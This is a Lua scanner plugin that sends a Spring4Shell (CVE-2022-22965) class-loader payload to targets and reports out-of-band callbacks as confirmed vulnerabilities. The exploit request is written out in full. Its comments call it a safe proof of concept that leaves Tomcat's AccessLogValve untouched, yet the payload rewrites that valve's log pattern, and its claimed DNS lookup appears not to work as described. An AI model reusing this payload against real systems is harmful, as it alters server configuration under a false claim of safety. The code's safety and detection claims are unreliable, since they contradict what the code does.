-- @name       Spring4Shell RCE (OOB)
-- @author     dirfuzz
-- @severity   critical
-- @cve        CVE-2022-22965
-- @tags       cve, cve2022, rce, spring, oast

function pre_scan(ctx)
    -- Disable if it doesn't look like a Java target
    if string.find(ctx.target, "%.jsp$") or string.find(ctx.target, "%.do$") or string.find(ctx.target, "%.action$") then
        return { skip = false }
    end
    return { skip = true }
end

function run(ctx)
    local oob_url, err = interactsh_url()
    if not oob_url then
        return nil
    end
    
    -- Safe PoC: Trigger a DNS lookup via java.net.InetAddress without modifying the Tomcat AccessLogValve.
    -- This guarantees we do not drop any files (not even temporary ones) on the target.
    local safe_payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bjava.net.InetAddress.getByName('" .. oob_url .. "')%7Di"

    http_send({ 
        method = "POST", 
        url = ctx.target, 
        body = safe_payload, 
        headers = {
            ["Content-Type"] = "application/x-www-form-urlencoded"
        } 
    })
    
    -- Sleep briefly so the request goes through, the OOB engine will handle the callback asynchronously.
    sleep_ms(2000)

    -- Return empty; the on_oob_hit hook will catch the callback if the target is vulnerable.
    return nil
end

function on_oob_hit(interaction)
    -- This function is asynchronously called by the engine when a DNS/HTTP callback occurs!
    return {
        match = true,
        label = "Spring4Shell-RCE",
        confidence = "Certain",
        path = interaction.remote_address, -- Using the remote IP as proof
        note = "Received " .. interaction.protocol .. " callback from " .. interaction.remote_address
    }
end